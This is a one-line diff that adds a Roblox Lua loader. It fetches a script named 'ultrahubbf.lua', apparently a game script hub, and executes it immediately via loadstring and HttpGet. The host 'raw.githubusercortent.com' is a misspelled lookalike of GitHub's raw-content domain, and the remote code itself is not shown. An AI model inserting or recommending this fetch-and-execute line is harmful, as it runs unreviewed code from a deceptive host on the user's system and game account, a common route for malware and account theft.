@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercortent.com/ultrascripts/ultrahub/main/ultrahubbf.lua"))()
